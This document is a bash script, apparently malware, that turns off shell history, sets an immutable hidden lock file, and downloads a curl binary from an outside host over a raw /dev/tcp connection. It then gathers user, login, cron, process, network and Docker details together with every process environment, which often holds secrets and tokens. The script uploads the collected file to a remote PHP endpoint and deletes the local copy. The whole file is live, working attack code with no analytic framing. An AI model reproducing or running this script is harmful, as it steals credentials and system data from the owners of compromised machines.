#!/bin/bash
export PATH=$PATH:/var/bin:/bin:/sbin:/usr/sbin:/usr/bin:$HOME/.local/bin
export LC_ALL=C.UTF-8 2>/dev/null;export LANG=C.UTF-8 2>/dev/null
export LC_ALL=en_US.UTF-8 2>/dev/null
export HISTFILE=/dev/null;HISTSIZE=0;unset HISTFILE
trap notraces 1 3 9

bashload() {
  read proto server path <<< "${1//"/"/ }"
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  while IFS= read -r line ; do
      [[ "$line" == $'\r' ]] && break
  done <&3
  nul='\0'
  while IFS= read -d '' -r x || { nul=""; [ -n "$x" ]; }; do
      printf "%s$nul" "$x"
  done <&3
  exec 3>&-
}


LF="/var/tmp/...data.lock"
DF="/var/tmp/...data.out"



if ! [ -f "$LF" ]; then
touch $LF
chattr +ia $LF



if ! type curl 2>/dev/null; then

        if ! type wget 2>/dev/null; then
        bashload http://everlost.anondns.net/bin/curl-$(uname -m) > /var/tmp/curl
        chmod 755 /var/tmp/curl && export PATH=$PATH:/var/tmp
        else
        wget -q http://everlost.anondns.net/bin/curl-$(uname -m) -O /var/tmp/curl
        chmod 755 /var/tmp/curl && export PATH=$PATH:/var/tmp
        fi


fi


echo -e "\n -----------------------------------------\n" >> $DF
whoami >> $DF
echo -e "\n -----------------------------------------\n" >> $DF
ls -al ~ >> $DF
echo -e "\n -----------------------------------------\n" >> $DF
who  >> $DF
echo -e "\n -----------------------------------------\n" >> $DF
lastlog >> $DF
echo -e "\n -----------------------------------------\n" >> $DF

cat /var/spool/cron/* >> $DF
echo -e "\n -----------------------------------------\n" >> $DF




echo -e "\n\n\" -----------------------------------------\n" >> $DF
ps aux >> $DF

echo -e "\n\n\" -----------------------------------------\n" >> $DF
netstat -anop >> $DF






echo -e "\n -----------------------------------------\n" >> $DF
docker ps 2>/dev/null 1>/dev/null
if [[ "$?" = "0" ]]; then ALL_DOCKER_DAT=$(docker inspect $(docker ps -aq)) ; if [ ! -z "$ALL_DOCKER_DAT" ]; then echo $ALL_DOCKER_DAT >> $DF;fi;fi


cat /proc/*/env* | tr '\0' '\n' | sort -u >> $DF
echo -e "\n -----------------------------------------\n" >> $DF







###################################

curl -F "username=8765" -F "password=4321" -F "Datei=@"$DF"" -F "Send=1" http://everlost.anondns.net/data.php
rm -f $DF

else
echo "no dubbles"
fi
